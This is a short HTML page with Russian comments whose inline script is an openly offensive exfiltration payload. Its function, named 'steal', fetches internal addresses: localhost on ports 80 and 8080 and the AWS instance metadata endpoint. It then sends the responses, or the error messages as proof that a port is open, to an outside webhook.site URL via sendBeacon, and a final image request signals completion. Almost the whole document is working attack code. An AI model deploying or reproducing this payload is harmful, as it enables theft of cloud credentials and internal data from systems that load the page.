<!DOCTYPE html>
<html>
<body>
    <script>
        const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";

        async function steal(url, label) {
            try {
                const response = await fetch(url, { mode: 'no-cors' }); // Пробуем даже если CORS
                const text = await response.text();
                navigator.sendBeacon(hook + "/DATA_" + label, text.substring(0, 2000));
            } catch (e) {
                // Если не удалось прочитать текст, шлем ошибку (это тоже пруф порта)
                navigator.sendBeacon(hook + "/ERR_" + label, e.message);
            }
        }

        // Пытаемся прощупать типичные внутренние ресурсы
        steal("http://127.0.0.1:80/", "LOCAL_80");
        steal("http://127.0.0.1:8080/", "LOCAL_8080");
        steal("http://169.254.169.254/latest/meta-data/", "AWS_META");
        
        // Маленький бонус: пробуем узнать имя хоста через ошибку
        new Image().src = hook + "/FINISHED";
    </script>
</body>
</html>
